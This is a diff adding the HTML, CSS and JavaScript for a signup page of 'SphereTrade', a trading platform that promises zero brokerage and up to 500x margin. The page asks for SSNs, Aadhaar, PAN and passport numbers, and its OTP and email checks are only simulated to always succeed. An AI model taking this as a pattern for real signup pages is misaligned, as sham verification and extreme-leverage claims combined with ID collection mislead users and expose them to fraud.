@@ -1,0 +1,1166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SphereTrade - Global Trading Platform</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #4A5BF4 0%, #3B4BDB 25%, #2D3ADB 50%, #1E2BDB 75%, #0F1CDB 100%);
+            min-height: 100vh;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .container {
+            display: grid;
+            grid-template-columns: 1fr 450px;
+            min-height: 100vh;
+        }
+
+        /* Left Section - Features */
+        .features-section {
+            padding: 60px 80px 60px 60px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .features-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse"><path d="M 20 0 L 0 0 0 20" fill="none" stroke="rgba(255,255,255,0.05)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 900;
+            margin-bottom: 40px;
+            background: linear-gradient(45deg, #fff, #e0e7ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero-title {
+            font-size: 2.8rem;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero-subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 60px;
+            font-weight: 300;
+            position: relative;
+            z-index: 2;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 30px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #FFD700, #FFA500);
+        }
+
+        .feature-icon {
+            width: 60px;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 1.5rem;
+        }
+
+        .feature-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .feature-subtitle {
+            font-size: 0.9rem;
+            opacity: 0.8;
+            line-height: 1.4;
+        }
+
+        .chat-widget {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            background: white;
+            color: #333;
+            padding: 15px 20px;
+            border-radius: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            animation: slideUp 0.5s ease;
+        }
+
+        .chat-widget h4 {
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .chat-widget p {
+            font-size: 0.8rem;
+            opacity: 0.7;
+        }
+
+        .whatsapp-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 60px;
+            height: 60px;
+            background: #25D366;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-decoration: none;
+            font-size: 1.5rem;
+            box-shadow: 0 5px 20px rgba(37, 211, 102, 0.3);
+            z-index: 1000;
+            animation: pulse 2s infinite;
+        }
+
+        /* Right Section - Registration Form */
+        .form-section {
+            background: white;
+            color: #333;
+            padding: 60px 50px;
+            position: relative;
+            box-shadow: -10px 0 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-title {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 40px;
+            color: #1a202c;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-input, .form-select {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 1rem;
+            background: #f7fafc;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .form-input:focus, .form-select:focus {
+            outline: none;
+            border-color: #4A5BF4;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(74, 91, 244, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: #a0aec0;
+        }
+
+        .phone-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-code {
+            flex: 0 0 120px;
+            display: flex;
+            align-items: center;
+            background: #4A5BF4;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 15px;
+            font-weight: 600;
+        }
+
+        .country-flag {
+            margin-right: 8px;
+            font-size: 1.2rem;
+        }
+
+        .phone-input {
+            flex: 1;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .otp-input {
+            flex: 1;
+        }
+
+        .otp-btn, .verify-btn {
+            background: #4A5BF4;
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            white-space: nowrap;
+            transition: all 0.3s ease;
+        }
+
+        .otp-btn:hover, .verify-btn:hover {
+            background: #3B4BDB;
+            transform: translateY(-2px);
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #a0aec0;
+            font-size: 1.2rem;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin: 30px 0;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-top: 4px;
+            transform: scale(1.3);
+            accent-color: #4A5BF4;
+        }
+
+        .checkbox-container label {
+            font-size: 0.9rem;
+            line-height: 1.5;
+            color: #4a5568;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #4A5BF4 0%, #3B4BDB 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(74, 91, 244, 0.3);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .help-text {
+            font-size: 0.85rem;
+            color: #718096;
+            text-align: center;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .help-icon {
+            cursor: pointer;
+            color: #4A5BF4;
+        }
+
+        .country-specific-docs {
+            background: #f0f4ff;
+            border: 2px solid #e0e7ff;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+            display: none;
+        }
+
+        .country-specific-docs.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        .docs-title {
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #1a202c;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .error-message {
+            color: #e53e3e;
+            font-size: 0.85rem;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .form-input.error {
+            border-color: #e53e3e;
+            background: #fed7d7;
+        }
+
+        .form-input.success {
+            border-color: #38a169;
+            background: #c6f6d5;
+        }
+
+        /* Mobile Responsiveness */
+        @media (max-width: 1024px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+
+            .features-section {
+                padding: 40px 30px;
+                min-height: auto;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+
+            .form-section {
+                padding: 40px 30px;
+                box-shadow: none;
+            }
+
+            .hero-title {
+                font-size: 2.2rem;
+            }
+
+            .chat-widget {
+                display: none;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .features-section {
+                padding: 30px 20px;
+            }
+
+            .form-section {
+                padding: 30px 20px;
+            }
+
+            .hero-title {
+                font-size: 1.8rem;
+            }
+
+            .phone-container, .otp-container {
+                flex-direction: column;
+            }
+
+            .country-code {
+                flex: none;
+            }
+
+            .whatsapp-btn {
+                width: 50px;
+                height: 50px;
+                font-size: 1.2rem;
+            }
+        }
+
+        /* Animations */
+        @keyframes slideUp {
+            from { transform: translateY(100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 5px 20px rgba(37, 211, 102, 0.3); }
+            50% { box-shadow: 0 5px 30px rgba(37, 211, 102, 0.6); }
+            100% { box-shadow: 0 5px 20px rgba(37, 211, 102, 0.3); }
+        }
+
+        .loading {
+            position: relative;
+        }
+
+        .loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid #fff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Left Section - Features -->
+        <div class="features-section">
+            <div class="logo">SphereTrade </div>
+            
+            <h1 class="hero-title">Trade With Zero Brokerage &<br>50X Margin</h1>
+            <p class="hero-subtitle">Indian Stocks (F&O), Indian Commodities, COMEX, US STOCKS,Bonds,Crypto,Forex Pairs</p>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">✓</div>
+                    <div class="feature-title">ZERO BROKERAGE</div>
+                    <div class="feature-subtitle">Trade without any brokerage fees</div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">💰</div>
+                    <div class="feature-title">24/7 Deposit and Withdrawal</div>
+                    <div class="feature-subtitle">Instant fund transfers anytime</div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">📈</div>
+                    <div class="feature-title">Upto 500x MARGIN</div>
+                    <div class="feature-subtitle">Maximum leverage for trading</div>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🌍</div>
+                    <div class="feature-title">Indian + US Stocks & Commodities</div>
+                    <div class="feature-subtitle">Global market access</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Section - Registration Form -->
+        <div class="form-section">
+            <h2 class="form-title">Create Account</h2>
+            
+            <form id="registrationForm">
+                <div class="form-group">
+                    <input type="text" class="form-input" id="fullName" name="fullName" placeholder="Enter Your Full Name" required>
+                    <div class="error-message" id="fullName-error">Please enter your full name</div>
+                </div>
+                
+                <div class="form-group">
+                    <div class="phone-container">
+                        <div class="country-code">
+                            <span class="country-flag">🇮🇳</span>
+                            <span>+91</span>
+                        </div>
+                        <input type="tel" class="form-input phone-input" id="phoneNumber" name="phoneNumber" placeholder="Enter Phone Number" required>
+                    </div>
+                    <div class="error-message" id="phoneNumber-error">Please enter a valid phone number</div>
+                </div>
+                
+                <div class="form-group">
+                    <div class="otp-container">
+                        <input type="text" class="form-input otp-input" id="otpCode" name="otpCode" placeholder="Enter OTP" disabled>
+                        <button type="button" class="otp-btn" id="requestOTP">Request OTP via SMS</button>
+                    </div>
+                    <div class="error-message" id="otpCode-error">Please enter the OTP</div>
+                </div>
+                
+                <div class="form-group">
+                    <div class="otp-container">
+                        <input type="email" class="form-input" id="email" name="email" placeholder="Email" required>
+                        <button type="button" class="verify-btn" id="verifyEmail">Verify Email</button>
+                    </div>
+                    <div class="help-text">
+                        Having trouble verifying email? <span class="help-icon" title="Contact support">ℹ️</span>
+                    </div>
+                    <div class="error-message" id="email-error">Please enter a valid email address</div>
+                </div>
+                
+                <div class="form-group">
+                    <div class="password-container">
+                        <input type="password" class="form-input" id="password" name="password" placeholder="Password" required>
+                        <button type="button" class="password-toggle" id="togglePassword1">👁️</button>
+                    </div>
+                    <div class="error-message" id="password-error">Password must be at least 8 characters long</div>
+                </div>
+                
+                <div class="form-group">
+                    <div class="password-container">
+                        <input type="password" class="form-input" id="confirmPassword" name="confirmPassword" placeholder="Confirm Password" required>
+                        <button type="button" class="password-toggle" id="togglePassword2">👁️</button>
+                    </div>
+                    <div class="error-message" id="confirmPassword-error">Passwords do not match</div>
+                </div>
+
+                <!-- Country Selection for Documents -->
+                <div class="form-group">
+                    <select class="form-select" id="country" name="country" required onchange="showCountryDocs()">
+                        <option value="">Select Your Country</option>
+                        <option value="IN">🇮🇳 India</option>
+                        <option value="US">🇺🇸 United States</option>
+                        <option value="UK">🇬🇧 United Kingdom</option>
+                        <option value="CA">🇨🇦 Canada</option>
+                        <option value="AU">🇦🇺 Australia</option>
+                        <option value="Other">🌍 Other Country</option>
+                    </select>
+                    <div class="error-message" id="country-error">Please select your country</div>
+                </div>
+
+                <!-- India Specific Documents -->
+                <div id="indiaDoc" class="country-specific-docs">
+                    <div class="docs-title">🇮🇳 Required Documents for India</div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="panNumber" name="panNumber" placeholder="PAN Number (ABCDE1234F)" pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}">
+                        <div class="error-message" id="panNumber-error">Please enter a valid PAN number</div>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="aadharNumber" name="aadharNumber" placeholder="Aadhar Number (1234 5678 9012)" pattern="[0-9]{4}\s[0-9]{4}\s[0-9]{4}">
+                        <div class="error-message" id="aadharNumber-error">Please enter a valid Aadhar number</div>
+                    </div>
+                </div>
+
+                <!-- US Specific Documents -->
+                <div id="usDoc" class="country-specific-docs">
+                    <div class="docs-title">🇺🇸 Required Documents for USA</div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="ssnNumber" name="ssnNumber" placeholder="Social Security Number (123-45-6789)" pattern="[0-9]{3}-[0-9]{2}-[0-9]{4}">
+                        <div class="error-message" id="ssnNumber-error">Please enter a valid SSN</div>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="dlNumber" name="dlNumber" placeholder="Driver's License Number">
+                        <div class="error-message" id="dlNumber-error">Please enter your driver's license number</div>
+                    </div>
+                </div>
+
+                <!-- UK Specific Documents -->
+                <div id="ukDoc" class="country-specific-docs">
+                    <div class="docs-title">🇬🇧 Required Documents for UK</div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="niNumber" name="niNumber" placeholder="National Insurance Number (AB123456C)" pattern="[A-Z]{2}[0-9]{6}[A-Z]{1}">
+                        <div class="error-message" id="niNumber-error">Please enter a valid NI number</div>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="passportNumber" name="passportNumber" placeholder="Passport Number">
+                        <div class="error-message" id="passportNumber-error">Please enter your passport number</div>
+                    </div>
+                </div>
+
+                <!-- Other Countries Documents -->
+                <div id="otherDoc" class="country-specific-docs">
+                    <div class="docs-title">🌍 Required Documents</div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="passportNumberOther" name="passportNumberOther" placeholder="Passport Number">
+                        <div class="error-message" id="passportNumberOther-error">Please enter your passport number</div>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="nationalId" name="nationalId" placeholder="National ID Number (Optional)">
+                    </div>
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="terms" name="terms" required>
+                    <label for="terms">
+                        ✓ I agree to <strong>Terms And Conditions</strong> and understand the risks involved in trading
+                    </label>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">Sign Up</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Chat Widget -->
+    <div class="chat-widget">
+        <h4>We're Online!</h4>
+        <p>How may I help you today?</p>
+    </div>
+
+    <!-- WhatsApp Button -->
+    <a href="https://wa.me/1234567890" class="whatsapp-btn" target="_blank">📱</a>
+
+    <script>
+        let otpSent = false;
+        let emailVerified = false;
+
+        // Show country-specific documents
+        function showCountryDocs() {
+            const country = document.getElementById('country').value;
+            const docs = ['indiaDoc', 'usDoc', 'ukDoc', 'otherDoc'];
+            
+            // Hide all document sections
+            docs.forEach(doc => {
+                document.getElementById(doc).classList.remove('show');
+            });
+            
+            // Show relevant document section
+            if (country === 'IN') {
+                document.getElementById('indiaDoc').classList.add('show');
+            } else if (country === 'US') {
+                document.getElementById('usDoc').classList.add('show');
+            } else if (country === 'UK') {
+                document.getElementById('ukDoc').classList.add('show');
+            } else if (country === 'CA' || country === 'AU' || country === 'Other') {
+                document.getElementById('otherDoc').classList.add('show');
+            }
+        }
+
+        // Request OTP functionality
+        document.getElementById('requestOTP').addEventListener('click', function() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            
+            if (!phoneNumber || phoneNumber.length < 10) {
+                showError('phoneNumber', 'Please enter a valid phone number');
+                return;
+            }
+            
+            this.classList.add('loading');
+            this.textContent = 'Sending...';
+            this.disabled = true;
+            
+            // Simulate OTP sending
+            setTimeout(() => {
+                this.classList.remove('loading');
+                this.textContent = 'OTP Sent ✓';
+                this.style.background = '#38a169';
+                document.getElementById('otpCode').disabled = false;
+                document.getElementById('otpCode').focus();
+                otpSent = true;
+                
+                // Show success message
+                alert('📱 OTP sent to your phone number!\nPlease enter the 6-digit code.');
+            }, 2000);
+        });
+
+        // Verify Email functionality
+        document.getElementById('verifyEmail').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            
+            if (!email || !emailRegex.test(email)) {
+                showError('email', 'Please enter a valid email address');
+                return;
+            }
+            
+            this.classList.add('loading');
+            this.textContent = 'Verifying...';
+            this.disabled = true;
+            
+            // Simulate email verification
+            setTimeout(() => {
+                this.classList.remove('loading');
+                this.textContent = 'Verified ✓';
+                this.style.background = '#38a169';
+                emailVerified = true;
+                document.getElementById('email').classList.add('success');
+                
+                // Show success message
+                alert('📧 Email verified successfully!');
+            }, 1500);
+        });
+
+        // Password toggle functionality
+        document.getElementById('togglePassword1').addEventListener('click', function() {
+            const password = document.getElementById('password');
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+            this.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+
+        document.getElementById('togglePassword2').addEventListener('click', function() {
+            const confirmPassword = document.getElementById('confirmPassword');
+            const type = confirmPassword.getAttribute('type') === 'password' ? 'text' : 'password';
+            confirmPassword.setAttribute('type', type);
+            this.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+
+        // Form validation functions
+        function showError(fieldId, message) {
+            const field = document.getElementById(fieldId);
+            const errorElement = document.getElementById(fieldId + '-error');
+            
+            field.classList.add('error');
+            field.classList.remove('success');
+            errorElement.textContent = message;
+            errorElement.classList.add('show');
+        }
+
+        function hideError(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorElement = document.getElementById(fieldId + '-error');
+            
+            field.classList.remove('error');
+            if (field.value.trim()) {
+                field.classList.add('success');
+            }
+            errorElement.classList.remove('show');
+        }
+
+        function validateField(field) {
+            const fieldId = field.id;
+            let isValid = true;
+
+            // Basic required field validation
+            if (field.hasAttribute('required') && !field.value.trim()) {
+                showError(fieldId, 'This field is required');
+                return false;
+            }
+
+            // Specific field validations
+            switch (fieldId) {
+                case 'phoneNumber':
+                    if (field.value && !/^[6-9]\d{9}$/.test(field.value)) {
+                        showError(fieldId, 'Please enter a valid 10-digit phone number');
+                        return false;
+                    }
+                    break;
+                
+                case 'email':
+                    if (field.value && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(field.value)) {
+                        showError(fieldId, 'Please enter a valid email address');
+                        return false;
+                    }
+                    break;
+                
+                case 'password':
+                    if (field.value && field.value.length < 8) {
+                        showError(fieldId, 'Password must be at least 8 characters long');
+                        return false;
+                    }
+                    break;
+                
+                case 'confirmPassword':
+                    const password = document.getElementById('password').value;
+                    if (field.value && field.value !== password) {
+                        showError(fieldId, 'Passwords do not match');
+                        return false;
+                    }
+                    break;
+                
+                case 'otpCode':
+                    if (field.value && !/^\d{6}$/.test(field.value)) {
+                        showError(fieldId, 'Please enter a valid 6-digit OTP');
+                        return false;
+                    }
+                    break;
+                
+                case 'panNumber':
+                    if (field.value && !/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(field.value)) {
+                        showError(fieldId, 'Please enter a valid PAN number (e.g., ABCDE1234F)');
+                        return false;
+                    }
+                    break;
+                
+                case 'aadharNumber':
+                    if (field.value && !/^\d{4}\s\d{4}\s\d{4}$/.test(field.value)) {
+                        showError(fieldId, 'Please enter Aadhar in format: 1234 5678 9012');
+                        return false;
+                    }
+                    break;
+                
+                case 'ssnNumber':
+                    if (field.value && !/^\d{3}-\d{2}-\d{4}$/.test(field.value)) {
+                        showError(fieldId, 'Please enter SSN in format: 123-45-6789');
+                        return false;
+                    }
+                    break;
+            }
+
+            if (isValid) {
+                hideError(fieldId);
+            }
+            
+            return isValid;
+        }
+
+        // Real-time validation
+        document.addEventListener('DOMContentLoaded', function() {
+            const formInputs = document.querySelectorAll('.form-input, .form-select');
+            
+            formInputs.forEach(input => {
+                input.addEventListener('blur', function() {
+                    validateField(this);
+                });
+                
+                input.addEventListener('input', function() {
+                    if (this.classList.contains('error')) {
+                        validateField(this);
+                    }
+                });
+            });
+
+            // Auto-format inputs
+            document.getElementById('aadharNumber').addEventListener('input', function() {
+                let value = this.value.replace(/\s/g, '');
+                if (value.length > 0) {
+                    value = value.match(/.{1,4}/g).join(' ');
+                    this.value = value.substr(0, 14); // Limit to 12 digits + 2 spaces
+                }
+            });
+
+            document.getElementById('ssnNumber').addEventListener('input', function() {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length > 0) {
+                    if (value.length <= 3) {
+                        this.value = value;
+                    } else if (value.length <= 5) {
+                        this.value = value.substr(0, 3) + '-' + value.substr(3);
+                    } else {
+                        this.value = value.substr(0, 3) + '-' + value.substr(3, 2) + '-' + value.substr(5, 4);
+                    }
+                }
+            });
+
+            document.getElementById('phoneNumber').addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').substr(0, 10);
+            });
+
+            document.getElementById('otpCode').addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').substr(0, 6);
+            });
+        });
+
+        // Form submission
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const requiredFields = this.querySelectorAll('[required]');
+            let isFormValid = true;
+            
+            // Validate all required fields
+            requiredFields.forEach(field => {
+                if (!validateField(field)) {
+                    isFormValid = false;
+                }
+            });
+
+            // Check if OTP was sent and entered
+            if (!otpSent) {
+                showError('phoneNumber', 'Please request and verify OTP first');
+                isFormValid = false;
+            } else {
+                const otpCode = document.getElementById('otpCode').value;
+                if (!otpCode || otpCode.length !== 6) {
+                    showError('otpCode', 'Please enter the 6-digit OTP');
+                    isFormValid = false;
+                }
+            }
+
+            // Check if email was verified
+            if (!emailVerified) {
+                showError('email', 'Please verify your email address first');
+                isFormValid = false;
+            }
+
+            // Check terms and conditions
+            const termsCheckbox = document.getElementById('terms');
+            if (!termsCheckbox.checked) {
+                alert('⚠️ Please accept the Terms and Conditions to continue');
+                isFormValid = false;
+            }
+
+            // Validate country-specific documents
+            const country = document.getElementById('country').value;
+            if (country === 'IN') {
+                const panNumber = document.getElementById('panNumber');
+                const aadharNumber = document.getElementById('aadharNumber');
+                if (!validateField(panNumber) || !validateField(aadharNumber)) {
+                    isFormValid = false;
+                }
+                if (!panNumber.value || !aadharNumber.value) {
+                    alert('⚠️ Please fill in PAN and Aadhar numbers for India');
+                    isFormValid = false;
+                }
+            } else if (country === 'US') {
+                const ssnNumber = document.getElementById('ssnNumber');
+                const dlNumber = document.getElementById('dlNumber');
+                if (!validateField(ssnNumber) || !validateField(dlNumber)) {
+                    isFormValid = false;
+                }
+                if (!ssnNumber.value || !dlNumber.value) {
+                    alert('⚠️ Please fill in SSN and Driver\'s License for USA');
+                    isFormValid = false;
+                }
+            } else if (country === 'UK') {
+                const niNumber = document.getElementById('niNumber');
+                const passportNumber = document.getElementById('passportNumber');
+                if (!validateField(niNumber) || !validateField(passportNumber)) {
+                    isFormValid = false;
+                }
+                if (!niNumber.value || !passportNumber.value) {
+                    alert('⚠️ Please fill in National Insurance Number and Passport for UK');
+                    isFormValid = false;
+                }
+            } else if (country !== '') {
+                const passportNumberOther = document.getElementById('passportNumberOther');
+                if (!validateField(passportNumberOther)) {
+                    isFormValid = false;
+                }
+                if (!passportNumberOther.value) {
+                    alert('⚠️ Please provide your Passport number');
+                    isFormValid = false;
+                }
+            }
+            
+            if (isFormValid) {
+                // Show loading state
+                submitBtn.classList.add('loading');
+                submitBtn.textContent = 'Creating Account...';
+                submitBtn.disabled = true;
+                
+                // Simulate account creation
+                setTimeout(() => {
+                    submitBtn.classList.remove('loading');
+                    submitBtn.textContent = '✅ Account Created!';
+                    submitBtn.style.background = 'linear-gradient(135deg, #48bb78 0%, #38a169 100%)';
+                    
+                    // Show success message
+                    setTimeout(() => {
+                        alert(`🎉 Welcome to SphereTrade!
+
+Your trading account has been created successfully!
+
+✅ Account Details:
+• Name: ${document.getElementById('fullName').value}
+• Phone: +91 ${document.getElementById('phoneNumber').value}
+• Email: ${document.getElementById('email').value}
+
+📧 Check your email for login credentials
+💰 Start trading with ZERO brokerage
+📈 Access to 500X margin trading
+
+Happy Trading! 🚀`);
+                        
+                        // Reset form or redirect
+                        window.location.href = '#dashboard'; // In real app, redirect to dashboard
+                    }, 1000);
+                }, 3000);
+            } else {
+                // Scroll to first error
+                const firstError = this.querySelector('.error');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                
+                // Shake submit button
+                submitBtn.style.animation = 'shake 0.5s';
+                setTimeout(() => {
+                    submitBtn.style.animation = '';
+                }, 500);
+            }
+        });
+
+        // Add shake animation
+        const shakeStyle = document.createElement('style');
+        shakeStyle.textContent = `
+            @keyframes shake {
+                0%, 20%, 40%, 60%, 80% { transform: translateX(0); }
+                10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            }
+        `;
+        document.head.appendChild(shakeStyle);
+
+        // Auto-hide chat widget after 10 seconds
+        setTimeout(() => {
+            const chatWidget = document.querySelector('.chat-widget');
+            if (chatWidget) {
+                chatWidget.style.animation = 'slideUp 0.5s reverse';
+                setTimeout(() => {
+                    chatWidget.style.display = 'none';
+                }, 500);
+            }
+        }, 10000);
+
+        // Add click handlers for help and info
+        document.addEventListener('click', function(e) {
+            if (e.target.classList.contains('help-icon')) {
+                alert('💬 Need help?\n\nContact our 24/7 support:\n📧 support@spheretrade.com\n📞 1800-SPHERE\n💬 Use the chat widget\n📱 WhatsApp support');
+            }
+        });
+
+        // Enhanced phone number validation for different countries
+        function updatePhoneValidation() {
+            const country = document.getElementById('country').value;
+            const phoneInput = document.getElementById('phoneNumber');
+            const countryCodeDiv = document.querySelector('.country-code');
+            
+            // Update country code and flag based on selection
+            const countryData = {
+                'IN': { flag: '🇮🇳', code: '+91', placeholder: 'Enter 10-digit phone number' },
+                'US': { flag: '🇺🇸', code: '+1', placeholder: 'Enter phone number' },
+                'UK': { flag: '🇬🇧', code: '+44', placeholder: 'Enter phone number' },
+                'CA': { flag: '🇨🇦', code: '+1', placeholder: 'Enter phone number' },
+                'AU': { flag: '🇦🇺', code: '+61', placeholder: 'Enter phone number' }
+            };
+            
+            if (countryData[country]) {
+                countryCodeDiv.innerHTML = `
+                    <span class="country-flag">${countryData[country].flag}</span>
+                    <span>${countryData[country].code}</span>
+                `;
+                phoneInput.placeholder = countryData[country].placeholder;
+            }
+        }
+
+        // Update phone validation when country changes
+        document.getElementById('country').addEventListener('change', updatePhoneValidation);
+
+        // Initialize tooltips and help text
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add tooltips to form fields
+            const tooltips = {
+                'fullName': 'Enter your full name as per government ID',
+                'phoneNumber': 'Enter your mobile number for OTP verification',
+                'email': 'Enter a valid email address for account notifications',
+                'password': 'Password should be at least 8 characters with numbers and letters',
+                'panNumber': 'Enter your 10-character PAN number',
+                'aadharNumber': 'Enter your 12-digit Aadhar number with spaces'
+            };
+
+            Object.keys(tooltips).forEach(fieldId => {
+                const field = document.getElementById(fieldId);
+                if (field) {
+                    field.title = tooltips[fieldId];
+                }
+            });
+        });
+
+        // Progressive form filling - save data as user types
+        let formAutoSave = {};
+        
+        document.querySelectorAll('.form-input, .form-select').forEach(input => {
+            input.addEventListener('input', function() {
+                formAutoSave[this.name || this.id] = this.value;
+                // In a real application, you might want to save to localStorage
+                // localStorage.setItem('sphereTradeFormData', JSON.stringify(formAutoSave));
+            });
+        });
+
+        // Form completion progress
+        function updateFormProgress() {
+            const requiredFields = document.querySelectorAll('[required]');
